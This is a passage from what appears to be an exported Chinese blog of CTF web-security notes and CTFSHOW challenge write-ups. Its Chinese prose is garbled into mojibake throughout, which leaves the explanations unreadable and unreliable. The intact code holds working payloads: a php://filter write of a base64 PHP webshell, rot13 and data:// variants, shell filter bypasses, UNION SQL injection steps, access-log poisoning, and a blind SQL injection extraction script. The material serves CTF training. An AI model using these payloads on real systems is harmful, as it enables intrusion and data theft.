<li>flaskæ¡†æ¶é¢˜é‡Œé¢ï¼Œå¯ä»¥è®¿é—®ä»»æ„çš„urlçš„æ—¶å€™ åœ¨<code>/proc/self/cmdline</code> å¯ä»¥è¯»å–å½“å‰è¿›ç¨‹çš„å‘½ä»¤ï¼Œæ‰€ä»¥å¯ä»¥å¾—åˆ°æ‰€åœ¨çš„è·¯ç”±</li>
</ul>
<h2 id="ä¿¡æ¯æ³„æ¼"><a href="#ä¿¡æ¯æ³„æ¼" class="headerlink" title="ä¿¡æ¯æ³„æ¼"></a>ä¿¡æ¯æ³„æ¼</h2><ul>
<li>gitæ–‡ä»¶æ³„æ¼  å·¥å…· Githack  <a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></li>
<li>.svnä¿¡æ¯æ³„éœ² å·¥å…· dvcs-ripper <a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a>  cdåˆ°å·¥å…·ç›®å½•ä¸‹çš„.svn&#x2F;pristine&#x2F;æŸ¥çœ‹å†…å®¹</li>
<li>.hgä¿¡æ¯æ³„æ¼ Mercurial æ˜¯ä¸€ç§è½»é‡çº§åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œä½¿ç”¨ hg initçš„æ—¶å€™ä¼šç”Ÿæˆ.hgã€‚ å·¥å…·dvcs-ripper  cdåˆ°.hgç›®å½•ï¼Œç”¨grep -r flag *å‘½ä»¤æœç´¢æœ‰flagå…³é”®å­—çš„æ–‡ä»¶</li>
<li>brzä¿¡æ¯æ³„æ¼ å·¥å…· dvcs-ripper CVS&#x2F;Rootå’ŒCVS&#x2F;Entries, åˆ†åˆ«è®°å½•äº†é¡¹ç›®çš„æ ¹ä¿¡æ¯å’Œæ‰€æœ‰æ–‡ä»¶çš„ç»“æ„</li>
<li>ç½‘ç«™æºç æ³„æ¼  åç¼€ zip,tar,rar,tar.gz  æ–‡ä»¶å www wwwroot web website backup back temp  æœ‰æ—¶index.php.bakä¹Ÿä¼šæœ‰æ³„æ¼</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç®€å•æ‰«æè„šæœ¬</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;url&quot;</span></span><br><span class="line"></span><br><span class="line">li1 = [<span class="string">&#x27;web&#x27;</span>, <span class="string">&#x27;website&#x27;</span>, <span class="string">&#x27;backup&#x27;</span>, <span class="string">&#x27;back&#x27;</span>, <span class="string">&#x27;www&#x27;</span>, <span class="string">&#x27;wwwroot&#x27;</span>, <span class="string">&#x27;temp&#x27;</span>]</span><br><span class="line">li2 = [<span class="string">&#x27;tar&#x27;</span>, <span class="string">&#x27;tar.gz&#x27;</span>, <span class="string">&#x27;zip&#x27;</span>, <span class="string">&#x27;rar&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> li1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> li2:</span><br><span class="line">        url_final = url + <span class="string">&quot;/&quot;</span> + i + <span class="string">&quot;.&quot;</span> + j</span><br><span class="line">        r = requests.get(url_final)</span><br><span class="line">        <span class="comment"># ä¿®æ­£æ‹¼æ¥ï¼Œè¾“å‡ºå“åº”çŠ¶æ€ç å’Œæœ€ç»ˆ URLï¼Œä¹Ÿå¯æ ¹æ®éœ€æ±‚æ”¹è¾“å‡ºå“åº”æ–‡æœ¬ç­‰</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;çŠ¶æ€ç : <span class="subst">&#123;r.status_code&#125;</span>, URL: <span class="subst">&#123;url_final&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>vim -r å¯ä»¥æŸ¥çœ‹åç¼€ä¸º.swpçš„å¤‡ä»½æ–‡ä»¶</li>
<li>WEB-INF&#x2F;web.xml æ³„æ¼ è¿™æ˜¯javaåº”ç”¨ä¸­é€šå¸¸ä¸å…è®¸è¢«è®¿é—®åˆ°çš„ç›®å½•ï¼Œåœ¨æœ‰äº›æƒ…å†µç”±äºé”™è¯¯çš„é…ç½®æˆ–è€…ç”±ç›®å½•ä¾¿åˆ©å¯ä»¥è¯»åˆ°è¿™ä¸ªç›®å½•ä¸­çš„å†…å®¹</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="code"><pre><span class="line">WEB-<span class="keyword">INF</span>/web.xml : Webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶, æè¿°äº†servletå’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™.</span><br><span class="line">WEB-<span class="keyword">INF</span>/database.properties : æ•°æ®åº“é…ç½®æ–‡ä»¶</span><br><span class="line">WEB-<span class="keyword">INF</span>/classes/ : ä¸€èˆ¬ç”¨æ¥å­˜æ”¾Javaç±»æ–‡ä»¶(.<span class="keyword">class</span>)</span><br><span class="line">WEB-<span class="keyword">INF</span>/lib/ : ç”¨æ¥å­˜æ”¾æ‰“åŒ…å¥½çš„åº“(.jar)</span><br><span class="line">WEB-<span class="keyword">INF</span>/src/ : ç”¨æ¥æ”¾æºä»£ç (.aspå’Œ.phpç­‰)</span><br></pre></td></tr></table></figure></div>
<ul>
<li>Apache&#x2F;Nginxé”™è¯¯é…ç½®<br>Windows IIS&#x2F;Apache ç›®å½•ç©¿è¶Š <a href="https://zhuanlan.zhihu.com/p/21516413">https://zhuanlan.zhihu.com/p/21516413</a><br>Nginxé…ç½®å®‰å…¨ <a href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html">https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html</a></li>
</ul>
<h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><ul>
<li><p>å››ç§å¸¸è§çš„æ–‡ä»¶åŒ…å«å‡½æ•°<br>include():æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶åªä¼šäº§ç”Ÿè­¦å‘Šï¼Œè„šæœ¬ç»§ç»­æ‰§è¡Œ<br>require():æ‰¾ä¸åˆ°è¢«åŒ…å«çš„æ–‡ä»¶ä¼šäº§ç”Ÿè‡´å‘½é”™è¯¯ï¼Œå¹¶åœæ­¢è„šæœ¬è¿è¡Œ<br>include_once()ä¸include()ç±»ä¼¼:å”¯ä¸€çš„åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«<br>require_once()ä¸require()ç±»ä¼¼:å”¯ä¸€çš„åŒºåˆ«æ˜¯å¦‚æœè¯¥æ–‡ä»¶çš„ä»£ç å·²ç»è¢«åŒ…å«ï¼Œåˆ™ä¸ä¼šå†æ¬¡åŒ…å«</p>
</li>
<li><p>phpä¼ªåè®®ï¼š</p>
  <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PERL"><figure class="iseeu highlight /perl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>ï¼‰file:<span class="regexp">//</span> è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</span><br><span class="line"><span class="number">2</span>ï¼‰http:<span class="regexp">//</span> è®¿é—® HTTP (S) ç½‘å€</span><br><span class="line"><span class="number">3</span>ï¼‰ftp:<span class="regexp">//</span> è®¿é—® FTP (S) URL</span><br><span class="line"><span class="number">4</span>) php:<span class="regexp">//</span> è®¿é—®å„ä¸ªè¾“å‡ºè¾“å…¥æµ  åœ¨CTFä¸­ç»å¸¸ä½¿ç”¨çš„æ˜¯php:<span class="regexp">//</span>filterå’Œphp:<span class="regexp">//inpu</span>t,php:<span class="regexp">//</span>filterç”¨äºè¯»å–æºç ã€‚php:<span class="regexp">//inpu</span>tç”¨äºæ‰§è¡Œphpä»£ç </span><br><span class="line"><span class="number">5</span>) zlib:<span class="regexp">//</span> å¤„ç†å‹ç¼©æµ</span><br><span class="line"><span class="number">6</span>) data:<span class="regexp">//</span> è¯»å–æ•°æ®   å’Œphp:<span class="regexp">//inpu</span>tçš„åŒºåˆ«æ˜¯dataä¼ªåè®®ç›´æ¥æ‰§è¡Œå†…å®¹</span><br><span class="line"><span class="number">7</span>) <span class="keyword">glob</span>:<span class="regexp">//</span> æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</span><br><span class="line"><span class="number">8</span>) phar:<span class="regexp">//</span> PHP å½’æ¡£</span><br><span class="line"><span class="number">9</span>) rar:<span class="regexp">//</span> RAR æ•°æ®å‹ç¼©</span><br></pre></td></tr></table></figure></div>
<p>ç”¨dataä¼ªåè®®ä¹Ÿå¯ä»¥è¯»æ–‡ä»¶data:&#x2F;&#x2F;text&#x2F;plain;base64,<code>[base64]</code></p>
</li>
<li><p><code>file_get_contents()</code> æ˜¯ PHP è¯»å–æ–‡ä»¶å†…å®¹çš„å‡½æ•°ï¼Œå®ƒå¯ä»¥ï¼š</p>
</li>
</ul>
<p>&emsp;è¯»å–æœ¬åœ°æ–‡ä»¶ (<code>file://</code>)<br>&emsp;è¯»å–è¿œç¨‹æ–‡ä»¶ (<code>http://</code> &#x2F; <code>https://</code>)<br>&emsp;è¯»å–ç‰¹æ®Šæµ (<code>php://input</code>, <code>data://</code> ç­‰)<br>&emsp;è¯»å–å‹ç¼©æ–‡ä»¶ (<code>compress.zlib://</code>)</p>
<ul>
<li><mark><code>enctype=&quot;multipart/form-data&quot;</code>Â çš„æ—¶å€™Â <code>php://input</code>Â æ˜¯æ— æ•ˆçš„</marked> è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„è¯·æ±‚ å®ƒéœ€è¦è¿›è¡Œç‰¹æ®Šçš„ã€æ›´å¤æ‚çš„å¤„ç†</li>
<li>phpfilterå†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼š</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">GETæäº¤</span><br><span class="line">?<span class="attribute">file</span>=php://filter/wirte=convert.base64-decode/resource=2.php</span><br><span class="line">POSTæäº¤</span><br><span class="line"><span class="attribute">content</span>=PD9waHAgYXNzZXJ0KCRfUE9TVFt4XSk7Pz4=</span><br></pre></td></tr></table></figure></div>
<p>contentæäº¤çš„å€¼æ˜¯ç»è¿‡base64ç¼–ç åçš„ä¸€å¥è¯æœ¨é©¬<code>&lt;?php assert($_POST[x]);?&gt;</code></p>
<ul>
<li>ç»•è¿‡æ­»äº¡ä»£ï¼š <code>file_put_contents($file,&quot;&lt;?php die();?&gt;&quot;.$content);</code> è¿™é‡Œè¦ç”¨åˆ°ä¸€ä¸ªè¿‡æ»¤å™¨<code>string.rot13</code> ä¹Ÿå°±æ˜¯å‡¯æ’’13ï¼Œè¿™æ ·å­å¯ä»¥ä¸å‡ºç°php</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">payload:</span><br><span class="line">GETæäº¤</span><br><span class="line">/?<span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">write</span>=<span class="keyword">string</span>.rot13/resource=<span class="number">3.</span>php</span><br><span class="line">POSTæäº¤</span><br><span class="line">content=<span class="meta">&lt;?</span>cuc nffreg(<span class="variable">$_CBFG</span>[k]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>dataä¼ªåè®®æœ‰æ£€æµ‹çš„æ—¶å€™ï¼Œå¯ä»¥å°è¯•<code>data:,</code> è¿™ç§æç«¯çš„ç®€å†™å½¢å¼  dataåè®®çš„å®Œæ•´æ ¼å¼æ˜¯<code>data:[&lt;mediatype&gt;][;base64],&lt;data&gt;</code><br>å¦‚æœæœ‰æ£€æµ‹phpç­‰å…³é”®å­—ï¼Œå¯ä»¥ä½¿ç”¨base64é€‰é¡¹<code>data:;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==</code></li>
<li>phpé»˜è®¤çš„è¾“å‡ºç¼“å†²åŒºå¤§å°ä¸º4096ï¼Œå¯ä»¥ç†è§£ä¸ºphpæ¯æ¬¡è¿”å›4096ä¸ªå­—èŠ‚ç»™socketè¿æ¥ ä¸´æ—¶æ–‡ä»¶åŒ…å«çŸ¥è¯†ç‚¹ï¼š <a href="https://mp.weixin.qq.com/s/ZgI8q_0FoXVSPIt01tN0YQ">https://mp.weixin.qq.com/s/ZgI8q_0FoXVSPIt01tN0YQ</a></li>
</ul>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><ul>
<li>execé»˜è®¤æ²¡æœ‰å›æ˜¾,éœ€è¦æ‰‹åŠ¨åŠ ä¸Šecho.è€Œä¸”åªä¼šå›æ˜¾å‡ºä¸€è¡Œç»“æœ,å› æ­¤å¸¸ç”¨ç¬¬äºŒä¸ªæ•°ç»„å‚æ•°æ¥æ”¶å¤šè¡Œç»“æœ.</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">payload:<span class="variable">$arr</span>=[]; <span class="built_in">echo</span> <span class="built_in">exec</span>(ipconfig,<span class="variable">$arr</span>); var_dump(<span class="variable">$arr</span>);</span><br></pre></td></tr></table></figure></div>
<p>shell_exec é»˜è®¤æ²¡æœ‰å›æ˜¾,éœ€è¦æ‰‹åŠ¨åŠ ä¸Šecho,å¯ä»¥è¾“å‡ºå¤šè¡Œç»“æœ.</p>
<ul>
<li><code>pcntl_exec</code> PHP &gt; 4.2.0 <code>&lt;?php pcntl_exec ( &quot;/bin/bash&quot; , array(&quot;whoami&quot;)); ?&gt;</code></li>
<li>å…¶ä»–å¯ä»¥çœ‹æ–‡ä»¶å†…å®¹çš„å‘½ä»¤<table>
<thead>
<tr>
<th align="left"><code>cat</code></th>
<th align="left"><code>tac</code></th>
<th align="left"><code>more</code></th>
<th align="left"><code>less</code></th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>od</code></td>
<td align="left"><code>xxd</code></td>
<td align="left"><code>tail</code></td>
<td align="left"><code>nl</code></td>
</tr>
<tr>
<td align="left"><code>sort</code></td>
<td align="left"><code>grep</code></td>
<td align="left"><code>uniq</code></td>
<td align="left"><code>file -f</code></td>
</tr>
</tbody></table>
</li>
<li>åˆ©ç”¨åå¼•å·å’Œbase64èƒ½ç»•è¿‡å¾ˆå¤šè¿‡æ»¤</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">`<span class="built_in">echo</span> bHMK | <span class="built_in">base64</span> -d`  `<span class="built_in">echo</span> L2Jpbgo= | <span class="built_in">base64</span> -d`</span><br></pre></td></tr></table></figure></div>
<ul>
<li>shellä¸­å¯ä»¥è®¾ç½®å˜é‡</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">a=c;b=at;c=fla;d=g.php;<span class="variable">$a</span><span class="variable">$b</span> <span class="variable">$&#123;c&#125;</span><span class="variable">$&#123;d&#125;</span></span><br><span class="line"><span class="comment">#ç­‰æ•ˆäº cat flag.php</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>è¿‡æ»¤ç©ºæ ¼å¸¸è§å§¿åŠ¿<br>è¯»æ–‡ä»¶ç”¨&lt;&gt; ä»£æ›¿  ${IFS}ä»£æ›¿ç©ºæ ¼  æ§åˆ¶å­—ç¬¦ä»£æ›¿ç©ºæ ¼<code>%09 %0b %0c</code>  å­—ç¬¦ä¸²æˆªæ–­ä»£æ›¿ç©ºæ ¼(åœ¨envå¯ä»¥æ‰¾åˆ°ä¸€äº›æœ‰ç©ºæ ¼çš„å˜é‡)<br><code>cmd=tac$&#123;PHP_EXTRA_CONFIGURE_ARGS:12:1&#125;fl*</code></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
        <category>ç¬”è®°</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
        <tag>ç¬”è®°</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFSHOWç¬¬ä¸€éƒ¨åˆ†webé¢˜wpæ•´ç†</title>
    <url>/posts/3905.html</url>
    <content><![CDATA[<p>CTFSHOWç¬¬ä¸€éƒ¨åˆ†webé¢˜wpæ•´ç†</p>
<span id="more"></span>

<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>ç”¨æˆ·åå’Œå¯†ç éƒ½æ˜¯æ³¨å…¥ç‚¹<br>ç¬¬ä¸€æ­¥ï¼šæŸ¥è¯¢æœ‰å‡ ä¸ªå­—æ®µï¼š 1â€™ or 1&#x3D;1 orde by 3# ï¼ˆ4å°±æ²¡æœ‰åˆ—æ•°äº† åˆ¤æ–­ä¹‹å3åˆ—ï¼‰<br>ç¬¬äºŒæ­¥ï¼š å‘ç°å›æ˜¾ä½ç½®ï¼š 1â€™ union select 1,2,3 #  å›æ˜¾2 è¯´æ˜å›æ˜¾ä½ç½®åœ¨2<br>ç¬¬ä¸‰æ­¥ï¼š æŸ¥çœ‹æ•°æ®è¡¨åç§°ï¼š 1â€™ union select 1,database(),3 #  å¾—åˆ°web2<br>ç¬¬å››æ­¥ï¼š å¾—åˆ°æ•°æ®è¡¨ 1â€™ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;database(); #</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AUTOHOTKEY"><figure class="iseeu highlight /autohotkey"><table><tr><td class="code"><pre><span class="line">**`group_concat(table_name)`**ï¼š`group_concat` æ˜¯ä¸€ä¸ª MySQL å†…ç½®çš„èšåˆå‡½æ•°ï¼Œå®ƒå°†æŸ¥è¯¢ç»“æœä¸­çš„å¤šä¸ªå€¼è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚`table_name` æ˜¯ `information_schema.tables` è¡¨ä¸­çš„åˆ—ï¼Œå­˜å‚¨äº†æ‰€æœ‰è¡¨çš„åå­—ã€‚</span><br><span class="line">**`table_schema`**ï¼šè¡¨ç¤ºæ•°æ®åº“çš„åç§°ï¼Œå³è¯¥è¡¨å±äºå“ªä¸ªæ•°æ®åº“</span><br></pre></td></tr></table></figure></div>
<p>æŸ¥åˆ°äº†æœ‰flag å’Œ userè¡¨<br>ç¬¬äº”æ­¥ï¼š æŸ¥çœ‹åˆ—å 1â€™ union select 1,group_concat(column_name),3 from information_schema.columns where table_name&#x3D;â€™flagâ€™; #<br>ï¼ˆå’Œä¸Šä¸€æ­¥çš„åŒºåˆ«å°±æ˜¯ç”¨information_schema.åé¢çš„å†…å®¹ä¸ä¸€æ ·ï¼‰ å‘ç°åªæœ‰flagè¿™åˆ—<br>æœ€åä¸€æ­¥æŸ¥è¯¢æ•°æ® 1â€™ union selcet 1,group_concat(flag),3 from web2.flag; #  ï¼ˆç”¨xx.xx æ¥è®¿é—®æ•°æ®åº“å’Œè¡¨ï¼‰<br> æˆ–è€…1â€™ union select 1,(select flag from flag),3; #</p>
<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>é¢˜é¢ï¼š <code>&lt;?phpÂ include($_GET[&#39;url&#39;]);?&gt;</code><br>å¯ä»¥æ‰¾åˆ°etc&#x2F;passwd<br>æ³•ä¸€ï¼š åˆ©ç”¨ä¹‹å‰dcç³»åˆ—é¶æœºçš„æ€è·¯ åˆ©ç”¨è®¿é—®è®°å½•æ–‡ä»¶ ç”¨bpæŠ“åŒ…å†™å…¥ä¸€å¥è¯æœ¨é©¬ ç„¶åç”¨èšå‰‘è¿æ¥<br>å…ˆæ‰¾åˆ°çœŸå®çš„ç›¸å¯¹è·¯å¾„  ç”¨bp<br><img src="https://pic1.imgdb.cn/item/67ac6279d0e0a243d4fe9780.png" alt="|325"><br>å‘ç°ç›¸å¯¹è·¯å¾„æ˜¯ä¸‰é‡<br>ç„¶åæˆ‘ä»¬å†ç”¨bpå‘ä¸€ä¸ªè¯·æ±‚<br>ç„¶åè®¿é—®..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>è¿™é¢˜å’Œdc5é‚£é¢˜ä¸ä¸€æ ·çš„æ˜¯ä¸€å¥è¯æœ¨é©¬è¦å†™åœ¨User-Agenté‚£é‡Œ  æ ¹æ®logæ–‡ä»¶å›æ˜¾å†…å®¹æ¥å®š<br><img src="https://pic1.imgdb.cn/item/67ac627dd0e0a243d4fe9782.png"><br>è¿™é‡Œè¿˜å› ä¸ºctfshowæ˜¯https æ‰€ä»¥è¿˜è¦ä¿®æ”¹è¿™ä¸ªå…¶ä»–è®¾ç½®<br>æ³•äºŒï¼šåˆ©ç”¨phpä¼ªåè®®<br>&#x2F;?url&#x3D;php:&#x2F;&#x2F;input   phpè„šæœ¬å¯ä»¥ç›´æ¥è¯»å–POSTè¯·æ±‚ä¸­çš„åŸå§‹æ•°æ®<br><img src="https://pic1.imgdb.cn/item/67ac6282d0e0a243d4fe9785.png" alt="|650"><br>é¡µé¢å›æ˜¾ä¸¤ä¸ªæ–‡ä»¶ è¿›å…¥æŸ¥çœ‹flag</p>
<p>æ³•äºŒï¼šsqlmapä½œå¼Š  ä½†æ˜¯è¦èŠ±ä¸å°‘æ—¶é—´è·‘</p>
<h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><p><img src="https://pic1.imgdb.cn/item/67ac62c9d0e0a243d4fe979a.png"><br>è¾“å…¥å¸¸è§çš„sqlæ³¨å…¥è¯­å¥ä¹‹åä¼šå‡ºç°sql inject error  æµ‹è¯•ä¹‹åå‘ç°äº†ç©ºæ ¼è¢«è¿‡æ»¤<br>å¯ä»¥ç”¨<code>/**/</code> ç»•è¿‡  æ¥ç€å’Œå¸¸è§„sqlæ³¨å…¥ä¸€æ ·<br><img src="https://pic1.imgdb.cn/item/67ac62cbd0e0a243d4fe979b.png" alt="|375"><br>è¿‡æ»¤ or and xor not ç»•è¿‡ </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="INI"><figure class="iseeu highlight /ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">and</span> = &amp;&amp; </span><br><span class="line"><span class="attr">or</span> = || </span><br><span class="line"><span class="attr">xor</span> = | <span class="comment"># å¼‚æˆ– </span></span><br><span class="line"><span class="attr">not</span> = !</span><br></pre></td></tr></table></figure></div>
<p>&#x3D;ç»•è¿‡    like  å¤§å°äºå·è¿‡æ»¤   !&lt;&gt;(&lt;&gt;ç­‰ä»·äºï¼&#x3D;)</p>
<h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><p><img src="https://pic1.imgdb.cn/item/67ff206d88c538a9b5d2645b.png"><br>è¿›å…¥ç¯å¢ƒä¹‹åï¼Œå¯ä»¥é€‰æ‹©æ–‡ç« ï¼Œç„¶åé€šè¿‡urlçœ‹å‡ºè¿™é‡Œæ˜¯é€šè¿‡idæ¥æŸ¥è¯¢çš„ï¼Œå­˜åœ¨sqlæ³¨å…¥<br>è¿™é‡Œæ˜¯æ•°å­—å‹æ³¨å…¥<br>å°è¯•é—­åˆï¼Œé¡µé¢è¿”å›sql inject errorï¼Œå½“è¾“å…¥wafçš„æ—¶å€™å°±å‡ºç°è¿™ä¸ªã€‚ ä½†æ˜¯å½“è¾“å…¥ä¸ºçœŸçš„æ—¶å€™ é¡µé¢è¿”å›æ‰€æœ‰æ–‡ç« çš„å†…å®¹ï¼Œæ‰€ä»¥å°±æ ¹æ®è¿™ä¸ªå·®å¼‚æ¥å†™åŸºäºå¸ƒå°”ç›²æ³¨çš„è„šæœ¬<br>ç”¨bpè·‘ä¸€ä¸‹sqlçš„ç»•è¿‡ è¿™é‡Œè¿”å›é•¿åº¦æ˜¯972çš„æ˜¯è¿‡æ»¤çš„<br><img src="https://pic1.imgdb.cn/item/6803105788c538a9b5dd0d8f.png"><br>è¿‡æ»¤äº†unionå’Œé€—å·ï¼Œé€—å·å¯ä»¥ç”¨from for è¿‡æ»¤</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests.packages.urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¦ç”¨ä¸å®‰å…¨è¯·æ±‚è­¦å‘Šï¼ˆå¯é€‰ï¼‰</span></span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">base_url = <span class="string">&#x27;https://fade2207-6d75-4b6b-90fb-1dd9463cc58b.challenge.ctf.show/index.php&#x27;</span></span><br><span class="line">ans = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">45</span>):  <span class="comment"># å‡è®¾æ•°æ®åº“åæœ€é•¿ 44 ä½</span></span><br><span class="line">    low, high = <span class="number">32</span>, <span class="number">127</span> </span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">       </span><br><span class="line">        <span class="comment">#payload = f&quot;0/**/or/**/ascii(substr((select/**/database())from/**/&#123;i&#125;/**/for/**/1))/**/&gt;/**/&#123;mid&#125;#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&quot;0/**/or/**/ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/&#123;i&#125;/**/for/**/1))/**/&gt;/**/&#123;mid&#125;#&quot;</span></span><br><span class="line">        <span class="comment">#payload = f&#x27;0/**/or/**/ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;)from/**/&#123;i&#125;/**/for/**/1))/**/&gt;/**/&#123;mid&#125;#&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;0/**/or/**/ascii(substr((select/**/group_concat(flag)/**/from/**/flag)from/**/<span class="subst">&#123;i&#125;</span>/**/for/**/1))/**/&gt;/**/<span class="subst">&#123;mid&#125;</span>#&#x27;</span></span><br><span class="line"></span><br><span class="line">        url = <span class="string">f&quot;<span class="subst">&#123;base_url&#125;</span>?id=<span class="subst">&#123;payload&#125;</span>&quot;</span>  </span><br><span class="line">        r = s.get(url, verify=<span class="literal">False</span>)</span><br><span class="line">        </span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;If&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span>  </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid     </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> low &lt;= <span class="number">126</span>:  </span><br><span class="line">        ans += <span class="built_in">chr</span>(low)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] ç¬¬ <span class="subst">&#123;i&#125;</span> ä½å­—ç¬¦: <span class="subst">&#123;<span class="built_in">chr</span>(low)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;final: <span class="subst">&#123;ans&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></div>
<p>åˆ†åˆ«å¾—åˆ°æ•°æ®åº“ web8  æ•°æ®è¡¨ flag å­—æ®µ  flag</p>
<h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><p><img src="https://pic1.imgdb.cn/item/67ac6308d0e0a243d4fe979f.png" alt="|475"><br>ç”¨bpçˆ†ç ´å¯†ç ä¹‹åæ²¡æœ‰ç»“æœ   è¿›å…¥robots.txt ç•Œé¢  å‘ç°æœ‰ä¸€ä¸ªindex.phpsç•Œé¢<br>æ–‡ä»¶å†…å®¹ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		<span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)&gt;<span 